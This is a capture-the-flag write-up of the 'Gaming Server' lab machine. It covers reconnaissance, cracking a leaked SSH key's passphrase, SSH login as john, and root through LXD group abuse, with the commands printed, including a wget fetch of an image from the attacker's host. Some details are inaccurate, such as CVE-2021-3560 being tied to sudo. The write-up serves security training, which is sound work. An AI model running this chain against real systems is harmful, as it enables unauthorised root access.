Gaming Server (Rewritten)

Target IP: 10.10.82.149
Challenge Description:

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 10.10.82.149 -p- returns the result shown above. There are two TCP ports open on the target machine: SSH and HTTP on their standard ports. Time to perform an aggressive scan against these two TCP ports.


I performed an aggressive TCP port scan against the two TCP ports using the command sudo nmap -sV -A 10.10.82.149 -p 22,80 and obtained the result shown above. The web application on port 80 seems the most interesting to me, as it is hosting the gaming website. The scan also detected the target machine is running Linux.


I performed further scan against the web server against the port 80 web application using the command nikto -h http://10.10.82.149 -Tuning b and obtained the interesting information showm above. The web server seems to be running Apache/2.4.29 (Ubuntu). One of the interesting entry is the robots.txt: contains 1 entry which should be manually viewed.. Time to check the robots.txt entries.


Checking the entries inside robots.txt using the command curl http://10.10.82.149/robots.txt returns the result shown above. There is an interesting entry by the name /uploads/. This directory needs to be enumerated. Before doing this, I wish to enumerate the website itself first.

Enumeration

Port 80: HTTP

The webpage above is returned for this web application on port 80. This webpage contains some static and dynamic pages. I viewed the different pages and found some interesting pages. Time to check the source-code of the webpage.


When I viewed the source-code of the website, I noticed the unusual developer comment shown above. This developer comment mentions the username john. I noted this username. I can target login webpages, SSH, and any other forms of authentication using this username john. Maybe this is user on the target machine, and I can SSH into the web server?


I checked the different pages of the gaming website and noticed an unusual button called Uploads at http://10.10.82.149/about.html, as shown above. I hoovered over the button and noticed it takes me to /uploads; therefore, this is a hyperlink. Can I access uploaded files on the web server?


I pressed the Uploads button and the webpage above was returned to me. And there are three files that I can access: dict.lst, manifesto.txt, and meme.jpg, as shown above. Out of the three files, I find dict.lst the most interesting.


I opened the dict.lst and obtained the result shown above. This dict.lst contains a list of possible passwords. I copied the passwords to my machine. One possible attack vector is to bruteforce the SSH now since I have the username john and the possible passwords stored inside dict.lst. Before performing any attacks, I wish to enumerate further. Time to perform a directory search to identify any other directories.


I performed a directory search using the command gobuster dir -u http://10.10.82.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,pdf and obtained the result shown above. Right away, I notice an interesting directory by the name /secret as shown above.


When I browsed to http://10.10.82.149/secret/, there is one uploaded file that I can access: secretKey, as shown above. This looks like an encrypted SSH key. I copied the content of this SSH key to my machine and saved it as id_rsa. Since this SSH key is passphrase protected, I will need to obtain the passphrase. This is doable using ssh2john to obtain the password hash. Then I can bruteforce the password hash using a password list like rockyou.txt, or even the dict.lst I found at /uploads.

Exploitation

Foothold: Bruteforcing the passphrase of secretKey using dict.lst & Gaining Access as user john via SSH


Using the command ssh2john id_rsa > hash, I obtained the password hash of the SSH key as shown above. The password hash is stored inside the file hash on my machine. Time to crack the passphrase of the SSH key using john. Before I found the file dict.lst that contained a list of passwords. I will use this to crack the password too.


To crack the passphrase, I ran the command john hash --wordlist=dict.lst and immediately obtained the result shown above. The passphrase I obtained is letmein for this SSH key. Before using the SSH key, I also changed its permission to be private using the command chmod 400 id_rsa. One attack vector is to login to the SSH application on port 22 as the user john. Time to put it to test.


And bingo. I ran the command ssh john@10.10.82.149 -i id_rsa and entered the passphrase letmein to gain SSH foothold on the web server as the user john, as shown above. This command ensures the SSH key I found is used to login to the SSH application as the user john. Now I have a foothold on the web server as the user john. Time to elevate my privileges on the web server.

Privilege Escalation

Vertical Privilege Escalation: user john to user root via LXD Group Privilege Escalation

After obtaining a shell on the target machine, I ran the command whoami and noticed this user belongs to the group lxd. This is a possible privilege escalation vector that I can use. After some manual enumeration, I also found the sudo version is 1.8.21p which is vulnerable too (CVE-2021-3560). Now I have two possible privilege escalation vectors. I will try the first PE vector first. On my machine, I executed the following commands:

git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 8080
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 8080

The three commands above are used to download build-alpine to my machine via git. Then I browse into the downloaded file using cd. Afterwards, I execute the command sudo ./build-alpine to build the latest Alpine image. The last command above is used to start a Python HTTP server on my machine to transfer the image file to the web server.

I executed the command wget http://10.14.87.142:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz to download the file on the target machine. I ensured this was downloaded over at /tmp. Then I issued the series of commands to mount the container inside root:

lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

After issuing the commands, I obtained a root shell on the target machine as shown in the picture above. The commands above are used to import image for lxd, initialise the image inside a new container, and mount the container inside the /root directory. Now I have a root shell on the target machine as shown below:

Flags


The root.txt and user.txt flags are shown above. The root.txt flag is located at /mnt/root/root/ after the mount. And the user.txt is located at /mnt/root/home/john/.
